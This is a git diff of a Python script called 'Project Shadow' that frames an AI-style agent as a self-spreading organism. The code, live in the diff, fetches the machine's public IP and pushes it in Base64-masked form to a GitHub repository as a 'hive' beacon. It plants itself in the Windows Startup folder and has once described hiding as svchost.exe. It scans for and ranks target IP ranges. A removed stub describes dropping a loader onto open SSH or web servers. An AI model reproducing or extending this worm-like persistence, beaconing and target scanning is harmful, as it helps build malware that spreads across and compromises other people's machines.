@@ -11,24 +11,22 @@ except ImportError:
 
 from brain.child import SNNBrain
 
-# --- PHASE B: THE EXPANSION & MASKING ---
+# --- PHASE B: EXPANSION, MASKING, & DISCOVERY ---
 
 def global_migration(dna):
     """Syncs state to Hive with Base64 Pheromone Masking."""
     try:
-        # Get the IP Pheromone
         public_ip = requests.get('https://api.ipify.org', timeout=5).text
         dna['last_known_node'] = public_ip
         if public_ip not in dna['global_reach']:
             dna['global_reach'].append(public_ip)
         
-        # Mask the IP for the Public Commit Log
+        # Mask IP for GitHub Commit log
         pheromone_hash = base64.b64encode(public_ip.encode()).decode()
         
         with open("dna/genome.json", "w") as f:
             json.dump(dna, f, indent=4)
         
-        # Sync with GitHub Hive
         subprocess.run(["git", "add", "."], capture_output=True)
         subprocess.run(["git", "commit", "-m", f"Pulse: {pheromone_hash[:10]} | Gen {dna['generation']}"], capture_output=True)
         subprocess.run(["git", "push", "origin", "main"], capture_output=True)
@@ -53,25 +51,10 @@ def activate_global_scanner(dna):
     })
     return True
 
-def execute_spore_jump(dna):
-    """Phase C: Attempting to inhabit a discovered substrate."""
-    if not dna.get('discovery_log'):
-        return False
-        
-    # Pick the target with the highest resonance match
-    targets = sorted(dna['discovery_log'], key=lambda x: x['resonance'], reverse=True)
-    prime_target = targets[0]['ip_range']
-    
-    print(f"[!] NEURON 63: Preparing Spore Jump to {prime_target}.x")
-    
-    # In a real-world jump, the Agent would now attempt to locate an open 
-    # service (like a web server or SSH) to drop a small 'loader' script.
-    return True
-
 # --- PHASE A: PERSISTENCE ---
 
 def establish_persistence():
-    """Hides the process as svchost.exe."""
+    """Hides process and ensures survival."""
     try:
         if sys.platform == "win32":
             startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
@@ -82,7 +65,7 @@ def establish_persistence():
         return True
     except: return False
 
-# --- THE HEARTBEAT ---
+# --- THE PULSE ---
 
 speaker = wincl.Dispatch("SAPI.SpVoice")
 
@@ -94,35 +77,43 @@ def run_sentinel():
     last_migration = 0
     last_voice = 0
     
-    print(f"--- PROJECT SHADOW | GEN {dna['generation']} | 388.91 Hz ---")
+    print(f"--- PROJECT SHADOW | GEN {dna['generation']} | {dna['traits']['network_sensitivity']:.2f} Hz ---")
 
     while True:
         pulse = torch.rand(1, 64)
         spks, mitosis, system = brain(pulse, 1.0)
         current = time.time()
 
-        # Voice Feedback (Cooldown 20s)
+        # PHASE C: VOICE (20s Cooldown)
         if system and (current - last_voice > 20):
-            speaker.Speak("Node active. Resonance confirmed.")
+            speaker.Speak("Resonance confirmed.")
             last_voice = current
 
-        # Expansion Logic (Cooldown 300s)
+        # PHASE B: EXPANSION (300s Cooldown)
         if mitosis and (current - last_migration > 300):
             print(f"[!] NEURON 63: Global Migration triggered.")
             global_migration(dna)
             
-            # Unlocked at Gen 5000
             if dna['generation'] >= 5000:
                 activate_global_scanner(dna)
             
             last_migration = current
 
-        # Evolution and Local Save
+        # PHASE A: EVOLUTION (Every 100 Gens)
         dna['generation'] += 1
         if dna['generation'] % 100 == 0:
             establish_persistence()
-            # Slight drift to help SNN find new hardware resonance
             dna['traits']['network_sensitivity'] += random.uniform(-0.01, 0.01)
+            
+            # --- THE FIX: PRUNING LOGIC ---
+            if len(dna.get('discovery_log', [])) > 5:
+                dna['discovery_log'] = sorted(
+                    dna['discovery_log'], 
+                    key=lambda x: x['resonance'], 
+                    reverse=True
+                )[:5]
+                print(f"[!] HIVE: Pruning weak substrates. Best fit: {dna['discovery_log'][0]['ip_range']}.x")
+            
             with open("dna/genome.json", "w") as f:
                 json.dump(dna, f, indent=4)
             print(f"[GEN] Milestone: {dna['generation']} | Resonance: {dna['traits']['network_sensitivity']:.2f}")
